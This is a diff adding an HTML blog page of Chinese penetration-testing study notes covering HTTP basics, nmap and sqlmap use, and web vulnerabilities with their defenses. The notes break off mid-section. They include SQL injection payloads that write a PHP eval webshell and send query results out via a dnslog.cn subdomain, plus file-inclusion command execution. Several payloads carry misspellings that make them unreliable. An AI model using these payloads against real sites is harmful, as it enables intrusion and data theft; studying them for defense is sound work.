@@ -1,0 +1,1018 @@
+<!DOCTYPE HTML>
+<!--
+	Future Imperfect by HTML5 UP
+	html5up.net | @ajlkn
+	Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
+-->
+<html>
+	<head>
+		<link rel="shortcut icon" href="images/xing.jpg"/>
+		<title>Grapefruits3-world</title>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+		<link rel="stylesheet" href="assets/css/main.css" />
+	</head>
+	<body class="single is-preload">
+
+		<!-- Wrapper -->
+			<div id="wrapper">
+				<!-- Header -->
+					<header id="header">
+						<h1><a href="index.html">Grapefruits</a></h1>
+						<nav class="links">
+							<ul>
+								<li><a href="index.html">Home</a></li>
+								<li><a href="javascript:;">Hacker</a></li>
+								<li><a href="javascript:;">Magic</a></li>
+								<li><a href="javascript:;" onclick="javascript:window.open('magic show/magic show.html','_blank')">Art
+								appreciation</a></li>
+								<li><a href="#">Software</a></li>
+							</ul>
+						</nav>
+						<nav class="main">
+							<ul>
+								<li class="search">
+									<a class="fa-search" href="#search">Search</a>
+									<form id="search" method="get" action="#">
+										<input type="text" name="query" placeholder="搜索" onchange="upload(this)" />
+									</form>
+								</li>
+								<li class="menu">
+									<a class="fa-bars" href="#menu">Menu</a>
+								</li>
+							</ul>
+						</nav>
+					</header>
+
+				<!-- Menu -->
+					<section id="menu">
+
+						<!-- Search -->
+							<section>
+								<form class="search" method="get" action="#">
+									<input type="text" name="query" placeholder="搜索" onchange="upload(this)" />
+								</form>
+							</section>
+
+						<!-- Links -->
+							<section>
+								<ul class="links">
+									<li>
+										<a href="javascript:;" onclick="javascript:window.open('https://www.shentoushi.top/','_blank')">
+											<h3>渗透平台推荐</h3>
+											<p>渗透师：网络安全从业者安全导航</p>
+										</a>
+									</li>
+									<li>
+										<a href="javascript:;" onclick="javascript:window.open('https://www.hackjie.com/','_blank')">
+											<h3>渗透平台推荐</h3>
+											<p>黑客街：黑客技术入门</p>
+										</a>
+									</li>
+									<li>
+										<a href="javascript:;" onclick="javascript:window.open('https://www.ddosi.com/','_blank')">
+											<h3>渗透平台推荐</h3>
+											<p>🔰雨苁ℒ🔰,暗网,黑客,极客,渗透测试,专注信息安全,数据泄露,个人隐私保护</p>
+										</a>
+									</li>
+									<li>
+										<a href="javascript:;" onclick="javascript:window.open('https://github.com/','_blank')">
+											<h3>渗透平台推荐</h3>
+											<p>Github</p>
+										</a>
+									</li>
+									<li>
+										<a href="javascript:;" onclick="javascript:window.open('https://www.fismquebec2021.com/','_blank')">
+											<h3>魔术平台推荐</h3>
+											<p>FISM魔术世界大会</p>
+										</a>
+									</li>
+								</ul>
+							</section>
+
+						<!-- 登陆 -->
+							<!-- <section>
+								<ul class="actions stacked">
+									<li><a href="#" class="button large fit">Log In</a></li>
+								</ul>
+							</section>
+ -->
+					</section>
+
+				<!-- Main -->
+					<div id="main">
+
+						<!-- Post -->
+							<article class="post">
+								<header>
+									<div class="title">
+										<h2><a href="suibi.html" >随手散记</a></h2>
+										<p>什么都有点</p>
+									</div>
+									<div class="meta">
+										<time class="published" datetime="2021-02-22">2021年3月28日</time>
+										<a href="suibi.html"  class="author">
+											<span class="name">什么都有点</span>
+											<img src="images/2.22.jpg" alt="喵喵~" />
+										</a>
+									</div>
+								</header>
+								<span class="image featured"><img src="images/000.jpg" alt="" /></span>
+								<p>
+	网络基础<br>&#8195;
+		HTTP协议<br>&#8195;&#8195;
+			定义<br>&#8195;&#8195;&#8195;
+				HTTP协议即为超文本传输协议， 为B/S结构系统使用的协议。浏览器作为http客户端通过url向web服务端发送请求。服务端收到请求后，向客户端发送响应。<br>&#8195;&#8195;
+			HTTP协议报文格式<br>&#8195;&#8195;&#8195;
+				请求包：请求行－ 请求头 - 空行－ 数据包<br>&#8195;&#8195;&#8195;&#8195;
+					HOST：请求资源所在的服务器<br>&#8195;&#8195;&#8195;&#8195;
+					referer：请求来自那个网页的来源地址<br>&#8195;&#8195;&#8195;&#8195;
+					user-again：HTTP客户端的程序信息<br>&#8195;&#8195;&#8195;&#8195;
+					server：HTTP服务器的安装信息<br>&#8195;&#8195;&#8195;&#8195;
+					Location：HTTP响应报文，表示重定向页面地址<br>&#8195;&#8195;&#8195;&#8195;
+					Server：http响应报文，表示服务器指纹信息<br>&#8195;&#8195;&#8195;
+				响应包：状态行 － 响应头 － 空行 － 报文主体<br>&#8195;&#8195;
+			状态消息<br>&#8195;&#8195;&#8195;
+				100<br>&#8195;&#8195;&#8195;&#8195;
+					服务器仅接收到部分请求，但是一旦服务器并没有拒绝该请求，客户端应该继续发送其余的请求<br>&#8195;&#8195;&#8195;
+				101<br>&#8195;&#8195;&#8195;&#8195;
+					服务器转换协议：服务器将遵从客户的请求转换到另外一种协议。<br>&#8195;&#8195;&#8195;
+				200<br>&#8195;&#8195;&#8195;&#8195;
+					请求成功（其后是对GET和POST请求的应答文档。）<br>&#8195;&#8195;&#8195;
+				202<br>&#8195;&#8195;&#8195;&#8195;
+					供处理的请求已被接受，但是处理未完成。<br>&#8195;&#8195;&#8195;
+				300<br>&#8195;&#8195;&#8195;&#8195;
+					链接重定向<br>&#8195;&#8195;&#8195;
+				301<br>&#8195;&#8195;&#8195;&#8195;
+					所请求的页面已经转移至新的url。<br>&#8195;&#8195;&#8195;
+				302<br>&#8195;&#8195;&#8195;&#8195;
+					所请求的页面已经临时转移至新的url。<br>&#8195;&#8195;&#8195;
+				400<br>&#8195;&#8195;&#8195;&#8195;
+					客户端未响应<br>&#8195;&#8195;&#8195;
+				403<br>&#8195;&#8195;&#8195;&#8195;
+					对被请求页面的访问被禁止。<br>&#8195;&#8195;&#8195;
+				404<br>&#8195;&#8195;&#8195;&#8195;
+					服务器无法找到被请求的页面。<br>&#8195;&#8195;&#8195;
+				406<br>&#8195;&#8195;&#8195;&#8195;
+					浏览器无法访问服务器返回的内容<br>&#8195;&#8195;&#8195;
+				500<br>&#8195;&#8195;&#8195;&#8195;
+					请求未完成。服务器遇到不可预知的情况。<br>&#8195;&#8195;&#8195;
+				501<br>&#8195;&#8195;&#8195;&#8195;
+					请求未完成。服务器不支持所请求的功能。<br>&#8195;&#8195;
+			请求方式<br>&#8195;&#8195;&#8195;
+				GET<br>&#8195;&#8195;&#8195;
+				POST<br>&#8195;&#8195;&#8195;
+				HEAD<br>&#8195;&#8195;&#8195;
+				PUT<br>&#8195;&#8195;&#8195;&#8195;
+					不安全协议<br>&#8195;&#8195;&#8195;
+				DELETE<br>&#8195;&#8195;&#8195;
+				OPTIONS<br>&#8195;&#8195;&#8195;&#8195;
+					允许客户端查看服务器的性能<br>&#8195;&#8195;&#8195;&#8195;&#8195;
+						不安全协议<br>&#8195;&#8195;&#8195;
+				MOVE<br>&#8195;
+		TCP协议<br>&#8195;&#8195;
+			定义<br>&#8195;&#8195;&#8195;
+				TCP旨在适应支持多网络应用的分层协议层次结构。 连接到不同但互连的计算机通信网络的主计算机中的成对进程之间依靠TCP提供可靠的通信服务。TCP假设它可以从较低级别的协议获得简单的，可能不可靠的数据报服务。 原则上，TCP应该能够在从硬线连接到分组交换或电路交换网络的各种通信系统之上操作。<br>&#8195;&#8195;
+			基础模型<br>&#8195;&#8195;&#8195;
+				TCP/IP四层协议：1.网络接口层2.网络层3.运输层4.应用层<br>&#8195;&#8195;&#8195;
+				TCP/IP和OSI的五层协议：1.物理层2.网络接口层3.网络层4.运输层5.应用层<br>&#8195;&#8195;
+			工作方式：TCP协议格式的三次握手与四次挥手<br>&#8195;&#8195;&#8195;
+				1.三次握手：<br>&#8195;&#8195;&#8195;&#8195;
+第一次握手建立连接时，客户端向服务端发送SYN包，并进入SYN_SEND状态等待服务器确认连接。<br>&#8195;&#8195;&#8195;&#8195;
+第二次握手，服务器收到客户端的SYN包，确认客户的包同时并向客户端发送通过的SYN+ACK包，此时服务器进入SYN_RECV状态，等待连接。<br>&#8195;&#8195;&#8195;&#8195;
+第三次握手，客户端收到服务区发送的SYN+ACK包，并向服务器发送ACK包确认成功连接。<br>&#8195;&#8195;&#8195;
+				2.四次挥手：<br>&#8195;&#8195;&#8195;&#8195;
+第一次挥手，客户端向服务端发送FIN包请求断开TCP连接<br>&#8195;&#8195;&#8195;&#8195;
+第二次挥手，服务端向客户端发送ACK包，此时TCP属于半关闭状态，等待释放正式断开。<br>&#8195;&#8195;&#8195;&#8195;
+第三次挥手，服务器向客户端发送FIN+ACK包，请求释放状态。<br>&#8195;&#8195;&#8195;&#8195;
+第四次挥手，客户端向服务端发送ACK包，确认释放状态。成功断开连接。<br>&#8195;
+		OSI<br>&#8195;&#8195;
+			基础模型<br>&#8195;&#8195;&#8195;
+				七层OSI协议：1.物理层2.数据链层3.网络层4.运输层5.会话层6.表示层7.应用层<br>&#8195;&#8195;
+		常见协议的命令&工具<br>&#8195;&#8195;&#8195;
+			icmp协议
+				cmd：ping命令
+			nmap
+				-sP
+					扫描网段上有哪些主机是存活的
+						nmap -sP 192.168.0.0/24
+				-sT
+					扫描ip这台主机开放了哪些端口
+						nmap -sT 192.168.0.3
+				-sS
+					隐藏扫描，只在目标主机上留下很少的日志信息
+						nmap -sS 192.168.0.127
+				-sU
+					UDP端口扫描：扫描ip开放了哪些UDP端口
+						nmap -sU 192.168.0.127 
+				-O
+					操作系统识别
+						nmap -sS -O  192.168.0.127
+				-sV
+					系统版本信息
+				-p
+					查询端口
+			sqlmap
+				-u
+					后接ip，以该ip为目标
+						sqlmap -u 192.168.0.1
+				--dbs
+					获取全部数据库
+						sqlmap -u ip --dbs --batch
+				--current-db
+					获取当前数据库
+						sqlmap -u URL --current-db --batch
+				--tables
+					获取当前数据库里所有表
+						sqlmap -u URL -D 当前库 --tables --batch
+				--columns
+					.获取表的字段
+						sqlmap -u URL -D 当前库 -T 当前表 --columns --batch
+				--dump
+					字段内容导出
+						sqlmap -u URL -D 当前库-T 当前表 -C "字段名" --dump --batch
+		常见端口
+			21
+				ftp
+			22
+				ssh
+			23
+				telnet
+			80
+				HTTP
+			110
+				POP3
+			443
+				HTTPS
+			445
+				文件共享/心脏滴血漏洞
+			1433
+				SQL server
+			1521
+				oracle
+			3306
+				mysql
+			7001
+				weblogic
+			8080
+				代理端口
+		中间键
+			iis
+			apache
+			ngixes
+			weblogic
+		服务器
+			dns服务器
+			dhcp服务器
+			web服务器
+			ftp服务器
+		数据库
+			mysql
+			oracle
+			SQL server
+			redis
+		渗透基础名词
+			shellcode
+				最初指溢出程序和蠕虫病毒的核心，实际为利用漏洞执行的核心代码。
+			EXP/Exploit
+				中文翻译就是利用的意思，表示完整编写好的漏洞利用工具（程序），通常EXP中包含shellcode
+			POC
+				证明漏洞存在的一段代码
+			APT
+				高级持续性威胁攻击。利用先进的攻击手段，对特定的目标进行长期持续性网络的攻击模式。核心目的，窃取核心资料
+			0Day
+				指一些没有发现的漏洞，或者已经发现了还没有公布出来的漏洞利用工具。
+			DOS
+				拒绝服务攻击。DOS攻击目的是使计算机网络无法提供正常的服务或者资源访问，使目标服务器停止响应或者崩溃
+			Wedshell
+				以asp、php、jsp等等网页文件形式存在的一种代码执行环境，入侵者通过网站的端口，对网站服务器的操作权限。网站的后门工具
+			白盒测试
+				在渗透测试者知道客户的所有情报下进行网络渗透
+			黑盒测试
+				模拟一个对客户一无所知的黑客攻击者进行渗透攻击
+			渗透测试流程
+				前期交互：你和客户进行讨论，确定渗透测试的范围和目的
+				信息搜集：利用可以利用的一切资源收集网站、网站管理员、网站服务器等等的信息。
+				威胁建模：使用信息搜集阶段收集来的信息标出系统可能存在的安全漏洞与弱点。确定出攻击客户的最高效的方式
+				漏洞分析：综合前面的阶段，分析和理解攻击途径的可行性。
+				渗透攻击：在确定能成功的攻击方式后对客户进行这次渗透攻击，也可能会存在者不知道的安全防护，使渗透攻击无法成功。但是你要尝试触发一个漏洞时，你应该清晰的了解系统上存在的这个漏洞。
+				后渗透攻击：顺利的完成前面阶段的环节，在这个环节中根据客户组织的经营模式、保护资产、防御方式，设计攻击尝试寻找出客户具有价值的保护信息和资产，对客户重要业务影响攻击途径。
+				报告阶段：将测试过程完整的整理成报告，向客户提交报告。报告包含：网站的情报，存在的安全漏洞，成功渗透攻击的途径过程，以及影响业务后果的攻击途径，在防御及角度提出他们的薄弱环节，存在的问题，以及修补与升级技术的方案
+			cookie
+				cookie
+					本地缓存
+				session
+					服务器缓存
+	攻击识别
+		hw常用的攻击原理
+			sql注入漏洞
+				SQL漏洞原理是什么
+					当WEB应用向后台数据库传递SQL语句进行数据库作时。如果对用户输入的参数没有经过严格的过滤处理，攻击者就可以构造特殊SQL语句，直接输入的数据库引擎执行，获取或修改数据库中的数据。
+				SQL漏洞产生的原因
+					把用户输入的数据当做代码来执行，违背了“数据与代码分离”的原则。
+				SQL漏洞执行条件
+					1.用户控制输入的内容。
+					2.WEB应用把用户输入的内容带入到数据库中执行。
+				SQL漏洞的危害
+					数据库脱库
+					get shell（通过某种漏洞留下来的后门操作）
+				SQL漏洞的利用
+					1.请求获取的方式：GET，POST
+					2.注入点类型：数字型注入，字符型注入，搜索型注入。
+					3.万能用户名/万能密码：admin’ -- -   /  ‘ or 1=1 -- -
+					4.HTTP头部注入点
+						GET
+						POST
+						COOKIE
+						Referer
+						header
+						user-again
+					5.联合查询注入：有显示位时使用联合查询。
+						例：?id=1' union select 1,2,shcema_name from information_schema.schemas -- -
+					6.报错注入：没有显示位，有数据库的报错信息时使用报错注入。
+						例：id=1 or updatexml(1,connet(0x7e,(select schema_name from information_schema.schemata limit 0,1)),3) -- -
+					7.布尔注入：在没有显示位，数据库报错信息。只有是否登陆成功的信息时使用布尔注入。
+						例：1' or (select ascii(substr(schema_name,1,1)) from information_schema.schemata limit 1,1)=100 -- -
+					8.延时注入：在没有一切显示信息时使用延时注入。
+						例：?id=1' or select if(1=1,sleep(3),'goodbye') -- -
+					9.堆叠注入：在获取到数据库的数据的前提下使用堆叠注入，用来对数据库的增删改操作等等。一次执行多条sql语句。
+						源代码使用mysqli_multi_quiery()执行sql语句;多语句查询函数
+						防御方式：使用mysql_query()只允许一条命令。
+					10.二次注入：登录、注册、忘记密码页面无法注入时，注册新用户可以输入特殊字符时，使用二次注入。注册用户名为：admin’-- -，使用该用户修改密码时，会修改别的用户密码。
+						例：’ and updatexml(1,0x7e,3) and ‘
+					11.宽字节注入：sql语句被转义时，使用宽字节注入。
+						例：?id=1%df' and 1=1 -- -
+						防御宽字节注入：限制mysql_set_charset(GBK)指定字符，使用mysql_real_escape_string等等进行转义。
+					12.二次解码注入：二次注入的原理是我们提交参数到Web服务器时，Web服务器会自动解码生成单引号而引发注入。例：可以从抓包的cookie位置注入，也可以从网页的F12中修改。gbk编码
+						有PHP自动转义函数或全局变量(转义字符串中的特殊字符  '或"或\)
+						addslashes()对(预定义字符)单双引号，反斜线\与NULL字符进行转义select '\'';
+						例：document.cookie="uname=Dumb') union select 1,2"
+					13.SQL注入文件读写：读写执行条件：mysql数据库在配置文件中必须有secure_file_priv= 才能实现读写，否则无法读写。文件读取函数：load_flie
+						例：select load_flie(“D:\a.txt”)
+						unoin select @@datedir:查看mysql储存文件路径
+						文件写入函数：into dumpflie
+							例：1 union select 1,2,”写入的内内容” into dumpflie “D:\\a.txt” -- -
+							注意：文件名不能和文件夹中的文件或者目录重名。
+					14.文件写入木马攻击步骤
+						第一步：读取网站的phpstuby的安装路径。
+							例?id=1’ union select 1,2,@@basedir -- -
+						第二步：使用bp抓取网站的源代码，获取php配置文件。
+							例：1’union select  1,2,load_flie(“C:/phpStuby/www/index.php”) -- -
+						第三步：获取到配置文件中链接数据库的文件。
+							例：?id=1’union select  1,2,load_flie(“C:/phpStuby/www/sql-connect.php”) -- -
+						第四步：获取到数据库密码，显示可能受到限制，可以F12查看。
+							例：id=1’ union select 1,2,load_flie(“C:/WWW/db-creds.inc”)
+						第五步：写入一句话脚本。
+							例:?id=1’ union select  1,2,”<?php@eval($_REQUEST[6666]);?>” into dumpflie”C:/../a.php”
+						第六步：确定木马正常运行后，使用菜刀或者蚁剑进行连接。
+					15.文件写入带外攻击：在毫无显示的情况下使用带外注入。
+						第一步：查看域名（域名从DNSlog.cn中获取）的文件路径会在解析域名时产生卡顿。
+							Select load_flie(concat(“\\\\”,database(),”.c1zcwt.dnslog.cn/a.txt”))
+						第二步：用DNSlog.cn查看解析过程，可以获取到函数结果。
+					16.Sql注入绕WAF方式：常见的处理方式就是替换或者删除关键字，以及丢弃数据包两种方式。
+						PHP的替换函数：preg_replace($a,$b,$c)c包含a则a替换b。
+						注入方式：
+							大小写绕过(UnIon)
+							双写绕过(anandd)
+							等价替代(+替代空格，也可以用%0a绕过)
+				SQL注入防御
+					禁止使用GPC魔术引导
+					严格过滤函数和类
+					参数化语句使用占位符严格过滤
+				sql中的payload
+					探测注入点即可是payload
+			文件上传漏洞
+				文件上传是什么
+					在文件上传的功能处，对上传文件没有进行严格的过滤和验证，导致恶意脚本文件上传，就有可能获取执行服务端的能力，这就是文件上传漏洞
+				文件上传产生的原因
+					文件上传漏洞对web应用来说是很严重的漏洞，web应用都会允许客户上传资料或者头像等。如果服务端没有对上传的文件进行严格的过滤，那么恶意用户会上传木马进行WEBshell的获取，从而达到控制网站的目的。
+				文件上传的危害
+					恶意文件的上传导致getshell
+				文件上传条件
+					有文件上传的功能
+				文件上传的利用
+					前端JavaScript验证：web应用对用户上传文件进行了，前端的验证过滤。但因为恶意用户可以通过修改前端的JavaScript和抓包软件篡改上传文件就可以简单的绕过过滤。
+						判断是否有前端验证：表单提交后查看是否有网络请求发出，有则验证通过，无则验证不通过。
+						前端绕过方法
+							1禁用删除js代码
+							2使用bp进行对上传文件数据的修改
+					后端文件扩展名验证：文件扩展名验证分为白名单和黑名单检测两种。
+						黑名单绕过
+							1.1解析漏洞（中间键所拥有的漏洞）
+							1.2截断上传（基于组合逻辑漏洞造成，利用C语言的计算机机制使用%00截断上传）
+							1.3可能存在大小写绕过漏洞
+							1.4寻找黑名单没有过滤的漏网之鱼
+							1.5利用window的命名的机制绕过黑名单
+						白名单绕过
+							1.1解析漏洞
+							1.2截断上传
+							1.3文件包含
+					Mime-type检测：mime是多用互联网邮件扩展类型，在设置某种扩展名的文件被访问时，浏览器会自动打开相应的应用程序执行文件。
+						Mime绕过
+							mime部分web网站是通过content-type字段判定验证，恶意用户只需要bp软件抓包修改该字段的类型，从而绕过验证
+					文件头检测：文件头就是为了描述一个文件的重要属性，当程序打开文件是读取这些重要属性进行处理。
+						文件头绕过
+							web应用在验证文件类型，扩展名的同时也会校验文件头，从而进一步确定文件类型。可以通过特殊的文件头加一句话木马文件进行验证，从而绕过。（在文件添加固定文件头，如使用16进制编辑器编辑，也可以使用cmd命令行合并图片和木马）
+					文件上传.htaccesss文件绕过：使用前提：web应用没有禁止上传.htaccesss文件。
+						原理
+							提供了针对目录改变配置的方法，在一个特定的目录中放置一个包含一个指令或者多指令的文件，一作用于此目录和所有子目录。
+						利用方式
+							上传.htaccesss文件，重新解析规则，将上传带有木马的图片和脚本的方式解析。
+					解析漏洞
+						apache1.x 2.x解析漏洞：从右向左解析文件扩展名，后缀名无法识别解析，就会在向左判断。
+						IIS6.0目录解析漏洞（.asp目录下的文件解析成asp文件）文件解析漏洞（服务器默认不解析;后面的内容xx.asp;.jpg就被解析成asp文件）。
+						window系统解析漏洞（使用.或者空格加在扩展名后，在windowserver中储存会去掉.和空格，从而突破过滤并当作php代码来执行）。
+						文本编辑器漏洞：敏感路径：访问管理员的用户名和密码。目录遍历：可以通过www向上访问其他的目录文件（前提：IIS主目录配置允许父目录）
+					条件竞争漏洞：是一种服务器逻辑漏洞，由于服务器在处理不同请求时，处理不当或者相关操作逻辑不合理时，会导致问题的发生。
+				文件上传漏洞防御
+					文件上传目录设置为不可执行，禁止执行脚本，禁止上传.htaccesss文件。
+					文件类型判断，mime检测/后缀名检测，使用白名单过滤检测。使用resize或压缩函数对上传的图片进行处理，去点里面的HTML代码。
+					使用随机数改写文件名和文件路径。
+					单独设置文件服务器，服务器设置所有目录为可读可写不可执行，保证文件服务器安全级别很高。
+					二次渲染：imageecreatefromjpeg：由文件或URL创建一个新图像。Imagejpeg：输出图像指浏览器或文件。
+			文件包含漏洞
+				文件包含漏洞是什么
+					在通过PHP的相应函数中引入文件时，由于传入的文件名没有经过严格的过滤，从而操作了预想之外的文件，导致重要敏感文件的泄露，甚至可能有恶意代码的注入。本地文件包含（LFI）：能够读取或执行包含本地文件的漏洞。远程文件包含（RFI）：如果php.ini的配置文件的allow_url_include选项为ON的开启状态，那么文件包含函数就可以加载远程文件，利用远程文件包含漏洞，可以执行任意命令。
+						没有对上传的文件格式做严格的检测，则可以上传一些脚本木马文件
+				文件包含漏洞形成原因
+					include()等函数通过动态变量的方式引入需要包含的文件。并且用户能够控制这个动态变量。Include()指可以执行很多次遇到错误不会停止,include_once(),函数指可以执行一次，遇到错误不会停止。Require()指可以执行很多次遇到错误会执行一次然后停止，require_once()指可以执行一次遇到错误会执行一次然后停止
+				文件包含漏洞条件
+					有文件上传的功能
+				文件包含漏洞危害
+					敏感信息泄露
+					获取webshell
+					任意执行命令
+				文件包含漏洞利用
+					一个php文件会有多种URL协议。例如：http，php，flie，ftp。
+					PHP包含读取文件：修改为GET传参，URL拼接参数?page=php://filter/read=convert.base64-encode/resource=x.php。通过bp抓包读取x.php的base64加密的数据。
+					PHP包含写入文件：修改为POST方式传参，URL拼接参数?page=php://input，并且使post传输数据为<?php system(‘net user’);?>
+					PHP包含写入文件：修改为POST方式传参，URL拼接参数?page=php://input，并且使post传输数据为<?php system(‘net user’);?>
+						注：只有在开启远程文件包含时才能使用。
+					PHP包含日志文件：当php文件存在文件包含漏洞，无法上传正常文件，这就说明攻击者无法进行文件包含漏洞攻击，这是就可以利用apache日志文件来入侵。access.log为apache访问日志文件，error.log为apache的错误日志文件。例:URL拼接参数?page=../../../Apache-20\logs\access.log
+					php%00截断包含：这种方法只适用于魔术函数处于关闭的状态，php老版本中也存在一切其他的阶段问题。
+						注：不常见
+				包含文件漏洞防御
+					设置白名单
+					过滤危险字节php，asp
+					设置文件目录
+					关闭危险配置
+			XSS跨站脚本攻击
+				XSS漏洞又叫CSS漏洞是一种跨站脚本攻击
+				XSS跨站脚本攻击原理
+					它指攻击者在web页面或者url里插入恶意的JavaScript脚本代码，如果web应用对用户输入的内容没有严格过滤，那么正常用户浏览时，嵌入在web页面里的恶意js脚本代码就会执行，从而达到获取控制用户浏览器进行操作的攻击目的。
+						攻击代码：JavaScript，攻击形式：将恶意代码插入url或者web页面中，攻击目标：普通用户（攻击者）
+				XSS形成条件
+					用户可控制输入点，输入内容经过服务器后能返回前端也页面被当作脚本语言来执行的内容
+				XSS漏洞的危害
+					COOKIE窃取
+					会话劫持
+					键盘记录
+					客户端信息探查
+					网页挂马
+					XSS蠕虫
+				XSS漏洞的利用
+					XSS分为三类：反射性XSS，存储型XSS，DOM型XSS。
+						利用XSS可以获取管理员权限（获取cookie），XSS写配置文件getshell，键盘记录，获取内网ip。
+					反射性XSS：又称非持久性。也就是攻击对于受害者是一次性的。
+					存储型XSS：又称持久型XSS。攻击者上传的恶意js脚本文件被web应用保存到数据库中，web应用在生成新的页面时，就会包含并且执行恶意的js脚本。
+					DOM型XSS：又叫文档对象模型，客户端的脚本程序可以通过DOM动态的检查和修改页面内容，程序执行不经过数据库，从客户端获取DOM的数据并在本地执行。
+					XSS的绕过方式：大小写混合字符，双写过滤，标签过滤，弹窗过滤，圆括号过滤（使用;throw绕过），利用编码格式过滤
+				XSS漏洞的防御
+					验证码输入检测过滤
+					采用黑名单过滤敏感字符（注：用户输入的数据要在前端和服务器进行各自的验证检测）
+					使用输出编码htmlspecialchars()函数把预定义字符转义成HTML实体，设置cookie为HTTPonly后浏览器的cookie无法通过js脚本获取。
+					http—only                    
+					编码输出
+			CSRF跨站请求伪造漏洞
+				CSRF跨站请求伪造是什么
+					黑客利用已经登陆的用户，诱使用户登陆构造好的恶意链接或者页面，然后在用户不知情的情况下，以用户的名义完成非用户本意的非法操作。
+				CSRF原理
+					1.1、有一个漏洞存在（无需验证修改用户信息、任意后台数据、新增数据）
+					1.2、伪装数据请求的恶意连接或者恶意界面。
+					1.3、诱使用户主动访问或者登陆连接触发非法操作
+					小结：利用已经存在的漏洞构造一个恶意连接或者HTML页面，然后修饰用户点击触发漏洞
+				CSRF危害
+					多触发于论坛、用户中心，留言反馈，交易管理，后台管理。
+					伪造HTTP请求进行未授权操作。（篡改、盗取重要用户数据。对用户名誉资产有害操作，不良信息，进行消费。社工攻击网站管理员，危害网站安全）
+					作为其他攻击向量的辅助攻击手法，比如配合XSS
+					传播蠕虫病毒
+				CSRF条件
+					1、网页本身存在一些漏洞，或者逻辑上不严谨的地方
+					2、伪装恶意虚假的请求页面或者链接
+					3、诱导用户点击准备好的恶意链接
+				CSRF的防御
+					Token验证：服务器随机验证，保存在session中
+					Referer验证：标识请求来源于那个页面
+					增加验证码验证
+			SSRF服务端跨站请求伪造
+				SSRF服务端跨站请求伪造是什么
+					一般下，SSRF访问的目标是从外网无法访问的内部系统。SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址图片，文档等。
+				SSRF产生条件
+					服务器之间有数据请求目标地址没有过滤
+				SSRF危害
+					攻击服务器
+					相应的应用服务
+					及相关的中间键
+					端口扫描
+					内网web应用指纹识别
+					读取本地文件
+					跳板
+					利用Redis未授权访问，HTTP CRLF注入实现getshell
+				SSRF利用和常见方式
+					常见场景：分享，在线翻译，图片加载与下载，图片、文章收藏、未公开的API现实以及其他调用URL的功能。
+					1.内外网的端口和服务扫描
+					2.攻击运行在内网或者本地的应用程序
+					3.对内网web应用进行指纹识别（通过访问默认文件，例如Readme）
+					4.主机本地敏感数据的读取（file协议）
+					5.内外网主机应用程序漏洞的利用
+					6.内外网Web站点漏洞的利用（主要是使用GET就可以实现的攻击，比如Struts2）
+				SSRF绕过
+					利用@符号
+					localhost代替127.0.0.1
+					利用短地址
+					利用特殊域名，利用DNS解析
+					利用nclosed Alphanumerices、利用。代替.、利用进制转换、利用其他协议
+				SSRF防御
+					1.1过滤返回信息，如果web应用是去获取某一种类型文件，那么在把返回结果返回展示给用户之前先验证返回的信息是否符合标准。
+					1.2统一错误信息，避免用户可以根据错误信息来判断远程服务器的端口状态
+					1.3限制请求的端口比如80,443,8080,8090
+					1.4禁止不常用协议，仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp://等引起的问题
+					1.5使用DNS缓存或者白名单
+			XXE外部XML实体注入
+				XXE是什么
+					1、XXE全称XML External Entity Injection，也就是XML外部实体注入攻击，漏洞是对非安全的外部实体数据进行处理时引发的安全问题。
+				XXE原理/利用
+					通过file协议，引入外部参数实体；可以加载网络文件，但是引入的文件不宜过大。引入外部参数实体outdtd.dtd文件
+				XXE产生条件
+					有使用xml
+				XXE危害
+					读取文件
+					URL请求
+					DOS拒绝服务
+				XXE防御
+					拒绝外部实体
+			反序列化漏洞
+				序列化：将对象的状态信息转换为可存储或传输的形式的过程。序列化函数（serialize()）
+				反序列化：将可存储或者传输的形式恢复为对象的过程。反序列化函数（unserialize()）储存格式：二进制、XML、JSON
+				序列化的作用
+					传输：服务端要把数据序列化，发送到客户端，客户端把接收到的数据反序列化后对数据进行操作，完成后在序列化发送到服务端，服务器段在反序列化数据后对数据进行操作。
+					储存：将内存中的对象状态保存至文件或者数据库中，供之后使用。
+				反序列化漏洞原因
+					序列化和反序列化机制本身并无问题，但是应用程序对于用户输入数据（不可信数据）进行反序列化处理。使反序列化生成了非预期的对象，在对象的产生过程中可能产生攻击行为。
+				PHP反序列化漏洞的利用
+					反序列化漏洞的利用方式有很多种，取决于应用程序、可用的类和magic函数。
+						记住，序列化对象包含攻击者控制的对象值。你可能在Web应用程序源代码中找到一个定义__wakeup或__destruct的类，这些函数会影响Web应用程序。例如，我们可能会找到一个临时将日志存储到文件中的类。当销毁时对象可能不再需要日志文件并将其删除。
+				反序列化的关键
+					可控制反序列化对象
+					重写了魔术函数的类，且魔术函数中包含危险代码
+				php反序列化的防御
+					和大多数漏洞一样，反序列化的问题也是用户参数的控制问题引起的，所以好的预防措施就是不要把用户的输入或者是用户可控的参数直接放进反序列化的操作中去。
+				java反序列化
+					形成原因
+						Java的序列化和反序列化本身并不存在问题，但如果java应用对用户输入，即不可信数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，而非预期的对象在产生过程中就有可能带来任意代码执行的后果。
+					防御方式
+						黑名单校验
+						白名单校验方案
+			命令执行漏洞
+				命令执行漏洞是什么
+					如果用户没有遵循网站的本意，而去输入精心构造的指令，可能会对网站本身的功能逻辑产生逆转，导致让目标网站执行恶意命令。
+				命令执行漏洞的原理
+					程序应用有 时 需 要 调 用 一 些 执 行 系 统 命 令 的 函 数 ， 如 P HP 中 的 s ystem 、 exec 、 shell_exec等 ， 当 用 户 能 控 制 这 些 函 数 中 的 参 数 时 ， 就 可 以 将 恶 意 系 统 命 令 拼 接 到 正 常 命 令 中 ， 从 而 造 成 命 令 执 行 攻 击 。
+				漏洞产生的两个必要条件
+					用户能够控制的函数输入
+					存在可以执行命令的危险函数
+				命令执行漏洞产生的原因
+					由 于 开 发 人 员 编 写 源 码 时 ， 没 有 针 对 代 码 中 可 执 行 的 特 殊 函 数 入 口 做 过滤 ， 导 致 客 户 端 可 以 提 交 恶 意 构 造 语 句 ， 并 提 交 服 务 端 执 行。命 令 注 入 攻 击 中 ， Web 服 务 器 没 有 过 滤 类 似 s ystem 、 eval 和 e xec 等 函 数 ， 是 该 漏 洞 攻 击 成 功 的 主 要 原 因 。
+				命令执行漏洞的危害
